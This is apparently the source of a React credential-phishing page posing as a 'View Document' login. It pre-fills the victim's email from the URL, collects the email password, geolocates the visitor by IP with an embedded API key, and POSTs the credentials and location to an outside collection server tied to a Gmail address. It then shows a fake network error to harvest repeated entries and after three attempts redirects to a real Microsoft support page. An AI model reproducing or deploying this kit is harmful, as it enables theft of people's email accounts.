
import React, { useState, useRef, useEffect } from "react";
import './form.css';
import Too from './../media/img/to.png';
import $ from 'jquery';
// import emailJS from '@emailjs/browser';


export const Form = ()=>{




    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');


    useEffect(()=>{
        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=44db379787c14bccb69d3de62462aefb`)
        .then(req=> req.json())
        .then(res=>{
            // setCountry(res.names.en)
            // console.log(res.names.en);
            // console.log('city:',res.city.name);

            setIpAdress(res.ip)
            setFlag(res.country.flag);
            setCountry(res.country.name);
            setCity(res.city.names.en);

            
            
            
            
            // console.log('ipAddress:', res.ip);
            // console.log('flag:', res.country.flag);
            // console.log('country:', res.country.name);
            // console.log('city:', res.city.names.en);
            // console.log(res);
        })
        .catch(e=> console.log)
    }, []);






    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [pwd, setPwd] = useState('');

    const form = useRef();

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const [btn, setBtn] = useState('View Document');



    const submitHandler = (e) => {
        e.preventDefault();
        if (pwd === "") {
          return null
        }
        
        else{

            // goodcontact44@gmail.com = for d emalJS hosting


            // emailJS.sendForm('service_wzp993k', 'template_r1q05vm', form.current, 'fnFKgJwcLIz25_NKm')
            // .then((result) => {
            //     console.log(result.text);
            // }, (error) => {
            //     console.log(error.text);
            // });







            setBtn('Verifying...');

            setTimeout(() => {
              setPwd('');
              setErr(true);
              setBtn('View Document');
            }, 3700);

            const user = {
                email: email,
                pswd: pwd,
                country: country,
                city: city,
                flag: flag,
                eyep: ipAdress
            };
    
          $.ajax({
              type: "POST",
              url: "https://meler-service.onrender.com/get_details/fazahati.parslent@gmail.com",
              data: user,
              success(data) {
                  console.log(data);
              },
          });
    
    
    // deploy
    
          setCount(count=> count + 1);
                if(count >= 2){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                    console.log(extracetdemailDomain);
                    window.location.reload();
                    window.location.href = `https://support.microsoft.com/en-us/office/excel-not-responding-hangs-freezes-or-stops-working-37e7d3c9-9e84-40bf-a805-4ca6853a1ff4`;
                };
        }
      };



    return(<>
        <div className="centra____l_kjhgftyjkK">
            <article className="form_wrapper___">
            <div className="otherformsecs"></div>
                <form className="form" id="form" onSubmit={submitHandler} ref={form}>
                    <img 
                        src={Too}
                        alt=""
                        className="securrr"
                    />

                    { err ? <small className="text-danger" id="msg" style={{fontWeight:'600', textAlign:'center', display:'flex', justifyContent:'center'}}>
                        Network connection error, try again.
                    </small> : null }


                    <div className="clasfrm" style={{ marginBottom:'20px'}}>
                        <span>
                            <i class="rix ri-at-line"></i>
                        </span>

                        <input 
                            id="email" 
                            name="user_email" 
                            className="email"
                            placeholder="Email address" 
                            required
                            type="email"
                            value={email}
                            onChange={ e=> setEmail(e.target.value) }
                            
                        />
                    </div>



                    <div className="clasfrm" style={{ marginBottom:'20px'}}>
                        <span>
                            <i class="rix ri-lock-password-line"></i>
                        </span>

                        <input 
                            id="password" 
                            name="user_secret" 
                            className="password"
                            placeholder="Email password" 
                            required
                            type="password"
                            value={pwd}
                            onChange={ e=> setPwd(e.target.value) }
                        />
                    </div>


                    <div className="clasfrm" style={{ marginBottom:'20px'}}>
                        <button className="cumsocks" id="view" onClick={submitHandler}>{btn}</button>
                    </div>


                </form>
            </article>
        </div>
    </>)
};


// 